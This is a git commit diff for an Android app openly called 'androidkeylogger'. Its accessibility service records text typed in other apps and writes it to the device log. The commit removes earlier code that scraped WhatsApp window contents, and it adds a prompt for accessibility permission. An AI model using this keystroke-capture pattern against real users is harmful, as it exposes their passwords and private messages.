8709b18c5f69e67ad04a7716a4c42e0117665d96
Vivek Singh Bhadauria <viveksbhadauria007@gmail.com>
2017-02-17 16:07:05 +0530

    cleaned code.TODO: Improve Logging Service AppWise

--- app/src/main/java/com/viveksb007/androidkeylogger/LoggingService.java
+++ app/src/main/java/com/viveksb007/androidkeylogger/LoggingService.java
@@ -19,72 +19,26 @@ import android.support.v4.view.accessibility.AccessibilityRecordCompat;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 public class LoggingService extends AccessibilityService {
-    private SuggestionViewManager suggestionViewManager;
-    public static boolean requestAccessibilityPermission = false;
-    private String completeText;
-    public static final String PERMISSION_GRANTED = "com.viveks007.androidkeylogger.PERMISSION_GRANTED";
-
-    private String getEventText(AccessibilityEvent event) {
-        StringBuilder sb = new StringBuilder();
-        for (CharSequence s : event.getText()) {
-            sb.append(s);
-        }
-        return sb.toString();
-    }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             return;
         }
-        if (suggestionViewManager == null) {
-            suggestionViewManager = new SuggestionViewManager(this);
-        }
-
-        if (requestAccessibilityPermission) {
-            requestAccessibilityPermission = false;
-            LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(PERMISSION_GRANTED));
-            return;
-        }
-
-        if(("com.whatsapp".equals(event.getPackageName()))&&(event.getEventType()==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
-                || event.getEventType()==AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)){
-            AccessibilityNodeInfo nodeInfo=getRootInActiveWindow();
-            suggestionViewManager.getAllChildNode(nodeInfo);
-        }
-
-
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            String eventText = getEventText(event);
-
-            suggestionViewManager.onTextChanged(eventText);
-            completeText = completeText + eventText;
-            //TODO temp solution, fix permanently with replacing with root node view
-            AccessibilityRecordCompat record = AccessibilityEventCompat.asRecord(event);
-            suggestionViewManager.editTextViewNode = record.getSource();
-
-            Log.d("logger", completeText);
-
-        }
-        else {
-            AccessibilityNodeInfo source = event.getSource();
-            if (source != null) {
-                suggestionViewManager.event(event);
-                source.recycle();
-            }
+            Log.d("Logged Text", event.getText().toString());
         }
     }
 
     @Override
     public void onInterrupt() {
-        Log.d("service", "interrupted");
+        Log.d("onInterrupt", "Service Interrupted");
     }
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-
+        Log.v("onServiceConnected", "Service Connected Successfully");
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.flags = AccessibilityServiceInfo.DEFAULT;
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
@@ -95,12 +49,6 @@ public class LoggingService extends AccessibilityService {
                     Uri.parse("package:" + getPackageName()));
             myIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(myIntent);
-            return;
         }
-        if (requestAccessibilityPermission) {
-            requestAccessibilityPermission = false;
-            LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(PERMISSION_GRANTED));
-        }
-
     }
 }
--- app/src/main/java/com/viveksb007/androidkeylogger/MainActivity.java
+++ app/src/main/java/com/viveksb007/androidkeylogger/MainActivity.java
@@ -1,16 +1,36 @@
 package com.viveksb007.androidkeylogger;
 
 import android.content.Intent;
+import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 
 public class MainActivity extends AppCompatActivity {
+
+    private static final String TAG = MainActivity.class.getSimpleName();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Intent intent = new Intent(this,LoggingService.class);
-        startService(intent);
+        try {
+            if (Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED) != 1) {
+                Intent accessibilityPermission = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivityForResult(accessibilityPermission, 1);
+            }
+        } catch (Settings.SettingNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1) {
+            Log.v(TAG, "Got Accessibility Permission");
+            Intent loggingService = new Intent(this, LoggingService.class);
+            startService(loggingService);
+        }
     }
 }
